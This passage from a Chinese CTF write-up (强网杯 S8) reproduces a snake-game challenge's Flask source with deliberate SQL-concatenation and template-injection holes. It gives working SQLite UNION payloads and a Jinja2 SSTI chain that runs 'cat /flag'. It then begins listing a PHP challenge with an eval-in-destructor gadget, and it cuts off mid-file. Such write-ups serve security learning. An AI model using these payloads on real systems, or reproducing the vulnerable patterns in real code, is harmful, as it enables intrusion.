<p>直接重写函数输出data.url</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/move'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">direction</span><span class="token operator">:</span> currentDirection <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">'game_over'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Game Over! Your score: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>data<span class="token punctuation">.</span>score<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">reset_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">'win'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>data<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            snake <span class="token operator">=</span> data<span class="token punctuation">.</span>snake<span class="token punctuation">;</span>
            food <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">x</span><span class="token operator">:</span> data<span class="token punctuation">.</span>food<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> data<span class="token punctuation">.</span>food<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            score <span class="token operator">=</span> data<span class="token punctuation">.</span>score<span class="token punctuation">;</span>
            <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>实际无用，因为那边的返回包里面不带data.url</p>
<p>于是嗯玩50分后跳转到了 &#x2F;snake_win?username&#x3D;</p>
<p>发现username存在sql注入，测试了下发现数据库是sqlite，单引号闭合</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">1&#39;order+by+3--
1&#39;order+by+4--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>共3列回显位</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">0&#39;+union+select+1,2,3--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102224308875.png" alt="image-20241102224308875"></p>
<p>best time处回显第3列</p>
<p>查数据库名</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">0&#39;+union+select+1,2,name+from+sqlite_master--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到<code>sqlite_autoindex_users_1</code></p>
<p>查表名</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">0&#39;+union+select+1,2,name+from+sqlite_master+where+type&#x3D;&#39;table&#39;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到<code>sqlite_sequence</code></p>
<p>查列名</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">0&#39;+union+select+1,2,sql+from+sqlite_master+where+type&#x3D;&#39;table&#39;and+name&#x3D;&#39;sqlite_sequence&#39;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到<code>CREATE TABLE sqlite_sequence(name,seq)</code></p>
<p>没啥用</p>
<p>因为是python起的服务，测试一下ssti，发现在 best time 处存在ssti</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">0&#39;+union+select+1,2,&quot;&#123;&#123;7*7&#125;&#125;&quot;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102225221634.png" alt="image-20241102225221634"></p>
<p>那直接rce了</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">0&#39;+union+select+1,2,&quot;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat+&#x2F;flag&#39;).read()&#125;&#125;&quot;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102230813787.png" alt="image-20241102230813787"></p>
<p>app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect
<span class="token keyword">import</span> random
<span class="token keyword">import</span> sqlite3
<span class="token keyword">import</span> time
<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SESSION_TYPE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'filesystem'</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'your_secret_key'</span>

<span class="token comment"># 初始化数据库</span>
<span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'users.db'</span><span class="token punctuation">)</span>
    c <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            best_time REAL DEFAULT 0
        )
    '''</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 查询用户</span>
<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'users.db'</span><span class="token punctuation">)</span>
    c <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE username = '"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> c<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> user

<span class="token comment"># 添加或更新用户</span>
<span class="token keyword">def</span> <span class="token function">add_or_update_user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> best_time<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'users.db'</span><span class="token punctuation">)</span>
    c <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> get_user<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">if</span> user<span class="token punctuation">:</span>
        <span class="token keyword">if</span> best_time <span class="token keyword">and</span> <span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> best_time <span class="token operator">&lt;</span> user<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'UPDATE users SET best_time = ? WHERE username = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>best_time<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'INSERT INTO users (username, best_time) VALUES (?, ?)'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> best_time <span class="token keyword">or</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 初始化游戏状态</span>
<span class="token keyword">def</span> <span class="token function">reset_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> snake<span class="token punctuation">,</span> direction<span class="token punctuation">,</span> food<span class="token punctuation">,</span> score<span class="token punctuation">,</span> start_time
    snake <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    direction <span class="token operator">=</span> <span class="token string">'RIGHT'</span>
    food <span class="token operator">=</span> <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    score <span class="token operator">=</span> <span class="token number">0</span>
    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

init_db<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
    reset_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'game.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_username'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">set_username</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    add_or_update_user<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/move'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> snake<span class="token punctuation">,</span> direction<span class="token punctuation">,</span> food<span class="token punctuation">,</span> score<span class="token punctuation">,</span> start_time
    
    <span class="token comment"># 获取新的方向</span>
    new_direction <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'direction'</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 更新方向</span>
    <span class="token keyword">if</span> new_direction <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'UP'</span><span class="token punctuation">,</span> <span class="token string">'DOWN'</span><span class="token punctuation">,</span> <span class="token string">'LEFT'</span><span class="token punctuation">,</span> <span class="token string">'RIGHT'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        direction <span class="token operator">=</span> new_direction
    
    <span class="token comment"># 计算新位置</span>
    head_x<span class="token punctuation">,</span> head_y <span class="token operator">=</span> snake<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> direction <span class="token operator">==</span> <span class="token string">'UP'</span><span class="token punctuation">:</span>
        head_y <span class="token operator">-=</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> direction <span class="token operator">==</span> <span class="token string">'DOWN'</span><span class="token punctuation">:</span>
        head_y <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> direction <span class="token operator">==</span> <span class="token string">'LEFT'</span><span class="token punctuation">:</span>
        head_x <span class="token operator">-=</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> direction <span class="token operator">==</span> <span class="token string">'RIGHT'</span><span class="token punctuation">:</span>
        head_x <span class="token operator">+=</span> <span class="token number">1</span>
    
    <span class="token comment"># 检查碰撞</span>
    <span class="token keyword">if</span> head_x <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> head_x <span class="token operator">>=</span> <span class="token number">20</span> <span class="token keyword">or</span> head_y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> head_y <span class="token operator">>=</span> <span class="token number">20</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>head_x<span class="token punctuation">,</span> head_y<span class="token punctuation">)</span> <span class="token keyword">in</span> snake<span class="token punctuation">:</span>
        reset_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'game_over'</span><span class="token punctuation">,</span> <span class="token string">'score'</span><span class="token punctuation">:</span> score<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 添加新头部</span>
    snake<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>head_x<span class="token punctuation">,</span> head_y<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 检查是否吃到食物</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head_x<span class="token punctuation">,</span> head_y<span class="token punctuation">)</span> <span class="token operator">==</span> food<span class="token punctuation">:</span>
        score <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            food <span class="token operator">=</span> <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> food <span class="token keyword">not</span> <span class="token keyword">in</span> snake<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        snake<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 检查是否通关</span>
    <span class="token keyword">if</span> score <span class="token operator">>=</span> <span class="token number">50</span><span class="token punctuation">:</span>
        elapsed_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time
        add_or_update_user<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elapsed_time<span class="token punctuation">)</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'win'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"/snake_win?username=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'ok'</span><span class="token punctuation">,</span> <span class="token string">'snake'</span><span class="token punctuation">:</span> snake<span class="token punctuation">,</span> <span class="token string">'food'</span><span class="token punctuation">:</span> food<span class="token punctuation">,</span> <span class="token string">'score'</span><span class="token punctuation">:</span> score<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/snake_win'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> get_user<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    best_time <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">if</span> user <span class="token keyword">else</span> <span class="token number">0</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/win.html'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;&#123; best_time &#125;&#125;"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>best_time<span class="token punctuation">)</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t <span class="token operator">=</span> Template<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">return</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>









<hr>
<h1 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h1><p>扫出<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>dashboard.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>你好，<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>看一下index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require</span> <span class="token string single-quoted-string">'user.php'</span><span class="token punctuation">;</span>
<span class="token keyword">require</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>

<span class="token variable">$sessionManager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SessionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$SessionRandom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SessionRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session_key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session_key'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token variable">$SessionRandom</span> <span class="token operator">-></span> <span class="token function">generateRandomString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$sessionManager</span><span class="token operator">-></span><span class="token function">filterSensitiveFunctions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: dashboard.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">require</span> <span class="token string single-quoted-string">'login.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>class.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">notouchitsclass</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">SessionRandom</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">generateRandomString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

